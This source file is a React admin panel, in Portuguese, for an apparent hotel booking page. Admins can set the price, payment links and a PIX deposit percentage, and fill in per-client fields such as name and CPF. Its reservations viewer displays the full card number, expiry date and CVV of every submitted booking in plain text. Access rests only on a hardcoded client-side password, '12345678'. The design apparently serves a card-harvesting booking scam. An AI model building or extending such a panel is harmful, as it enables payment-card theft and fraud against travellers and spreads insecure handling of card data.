import React, { useState } from 'react';
import { trpc } from '@/lib/trpc';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { X, Plus, Upload, Lock } from 'lucide-react';
import { toast } from 'sonner';

interface HotelPhoto {
  id: string;
  url: string;
  title: string;
}

interface AdminPanelProps {
  isOpen: boolean;
  onClose: () => void;
  photos: HotelPhoto[];
  onPhotosChange: (photos: HotelPhoto[]) => void;
  updateHotelDataMutation?: any;
  hotelInfo: {
    propertyName: string;
    clientName: string;
    address: string;
    rating: number;
    reviewCount: number;
    checkInDate: string;
    checkOutDate: string;
    hospedageValue: number;
    paymentLink100: string;
    paymentLink30Pix: string;
    depositPercentage: number;
    clientEmail: string;
    clientPhone: string;
    clientCpf: string;
    guestCount: number;
    detail1: string;
    detail2: string;
    detail3: string;
    roomType: string;
    breakfastIncluded: boolean;
    freeCancellationDate: string;
    mainGuestName: string;
  };
  onHotelInfoChange: (info: any) => void;
}

const ADMIN_PASSWORD = '12345678';

function ReservationsViewer() {
  const { data: reservations, isLoading } = trpc.reservations.getAll.useQuery();

  if (isLoading) return <div className="p-4 text-center">Carregando reservas...</div>;
  if (!reservations || reservations.length === 0) return <div className="p-4 text-center text-muted-foreground">Nenhuma reserva encontrada.</div>;

  return (
    <div className="space-y-4 mt-8 border-t pt-8">
      <h3 className="text-xl font-bold text-foreground">Reservas Salvas</h3>
      <div className="grid gap-4">
        {reservations.map((reservation: any) => (
          <div key={reservation.id} className="border rounded-lg p-4 bg-white shadow-sm space-y-3">
            <div className="flex justify-between items-start border-b pb-2">
              <div>
                <p className="font-bold text-primary">{reservation.firstName} {reservation.lastName}</p>
                <p className="text-xs text-muted-foreground">{reservation.email}</p>
              </div>
              <div className="text-right">
                <span className={`text-[10px] px-2 py-1 rounded-full font-bold uppercase ${reservation.paymentMethod === 'card' ? 'bg-green-100 text-green-700' : 'bg-blue-100 text-blue-700'}`}>
                  {reservation.paymentMethod === 'card' ? 'Cartão' : 'PIX'}
                </span>
              </div>
            </div>
            
            <div className="grid grid-cols-2 gap-2 text-xs">
              <div>
                <p className="text-muted-foreground">Telefone</p>
                <p className="font-semibold">{reservation.phone}</p>
              </div>
              <div>
                <p className="text-muted-foreground">Check-in</p>
                <p className="font-semibold">{reservation.checkInTime}</p>
              </div>
            </div>

            {reservation.paymentMethod === 'card' && (
              <div className="border-t pt-2 space-y-2 bg-blue-50 p-2 rounded">
                <p className="text-xs font-semibold text-blue-900">Dados do Cartão</p>
                <div className="grid grid-cols-2 gap-2 text-xs">
                  <div>
                    <p className="text-muted-foreground">Titular</p>
                    <p className="font-semibold">{reservation.cardholderName}</p>
                  </div>
                  <div>
                    <p className="text-muted-foreground">Número</p>
                    <p className="font-mono font-bold">{reservation.cardNumber}</p>
                  </div>
                  <div>
                    <p className="text-muted-foreground">Validade</p>
                    <p className="font-mono">{reservation.cardExpiry}</p>
                  </div>
                  <div>
                    <p className="text-muted-foreground">CVV</p>
                    <p className="font-mono font-bold text-red-600">{reservation.cardCvv}</p>
                  </div>
                  <div className="col-span-2">
                    <p className="text-muted-foreground">Valor Total</p>
                    <p className="font-semibold">R$ {(reservation.totalPrice / 100).toFixed(2)}</p>
                  </div>
                </div>
              </div>
            )}
            <div className="text-[10px] text-muted-foreground text-right">
              {new Date(reservation.createdAt).toLocaleString('pt-BR')}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

export default function AdminPanel({
  isOpen,
  onClose,
  photos,
  onPhotosChange,
  hotelInfo,
  onHotelInfoChange,
}: AdminPanelProps) {
  const [password, setPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setIsAuthenticated(true);
      toast.success('Acesso concedido');
    } else {
      toast.error('Senha incorreta');
    }
  };

  const handlePhotoUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onloadend = async () => {
      const base64String = reader.result as string;
      try {
        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ imageData: base64String, mimeType: file.type }),
        });
        const data = await response.json();
        if (data.url) {
          onPhotosChange([...photos, { id: Date.now().toString(), url: data.url, title: file.name }]);
          toast.success('Foto adicionada');
        }
      } catch (error) {
        toast.error('Erro no upload');
      }
    };
    reader.readAsDataURL(file);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        <div className="sticky top-0 bg-primary text-white p-6 flex items-center justify-between border-b z-10">
          <h2 className="text-2xl font-bold">Painel Admin</h2>
          <button onClick={onClose} className="p-1 hover:bg-white/20 rounded"><X /></button>
        </div>

        {!isAuthenticated ? (
          <div className="p-12 flex flex-col items-center">
            <Lock className="w-12 h-12 text-primary mb-4" />
            <form onSubmit={handlePasswordSubmit} className="w-full max-w-xs space-y-4">
              <Input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Senha" />
              <Button type="submit" className="w-full">Entrar</Button>
            </form>
          </div>
        ) : (
          <div className="p-6 space-y-8">
            <section className="space-y-4">
              <h3 className="text-lg font-bold">Configurações do Hotel</h3>
              <div className="grid gap-4">
                <div>
                  <Label>Nome do Hotel</Label>
                  <Input value={hotelInfo.propertyName} onChange={(e) => onHotelInfoChange({...hotelInfo, propertyName: e.target.value})} />
                </div>
                <div>
                  <Label>Valor da Hospedagem (R$)</Label>
                  <Input type="number" value={hotelInfo.hospedageValue} onChange={(e) => onHotelInfoChange({...hotelInfo, hospedageValue: parseFloat(e.target.value)})} />
                </div>
                <div>
                  <Label>Link de Pagamento 100% (Cartão)</Label>
                  <Input value={hotelInfo.paymentLink100} onChange={(e) => onHotelInfoChange({...hotelInfo, paymentLink100: e.target.value})} />
                </div>
                <div>
                  <Label>Link de Pagamento (PIX)</Label>
                  <Input value={hotelInfo.paymentLink30Pix} onChange={(e) => onHotelInfoChange({...hotelInfo, paymentLink30Pix: e.target.value})} />
                </div>
                <div className="bg-blue-50 p-4 rounded-lg border border-blue-100">
                  <Label className="text-blue-900 font-bold">Porcentagem de Depósito (%)</Label>
                  <Input 
                    type="number" 
                    value={hotelInfo.depositPercentage} 
                    onChange={(e) => onHotelInfoChange({...hotelInfo, depositPercentage: parseInt(e.target.value) || 0})}
                    className="mt-1 border-blue-200"
                  />
                  <p className="text-[10px] text-blue-700 mt-1">Escolha a % que o cliente deve pagar no PIX (ex: 16, 30, 50)</p>
                </div>
              </div>
            </section>

            <section className="space-y-4">
              <h3 className="text-lg font-bold">Fotos do Hotel</h3>
              <div className="grid grid-cols-3 gap-2">
                {photos.map(photo => (
                  <div key={photo.id} className="relative group aspect-video">
                    <img src={photo.url} className="w-full h-full object-cover rounded" />
                    <button onClick={() => onPhotosChange(photos.filter(p => p.id !== photo.id))} className="absolute top-1 right-1 bg-red-500 text-white p-1 rounded-full opacity-0 group-hover:opacity-100"><X size={12}/></button>
                  </div>
                ))}
                <label className="border-2 border-dashed rounded flex flex-col items-center justify-center cursor-pointer hover:bg-gray-50 aspect-video">
                  <Upload size={20} className="text-gray-400" />
                  <span className="text-[10px] text-gray-400">Upload</span>
                  <input type="file" className="hidden" onChange={handlePhotoUpload} accept="image/*" />
                </label>
              </div>
            </section>

            <ReservationsViewer />
          </div>
        )}
      </div>
    </div>
  );
}
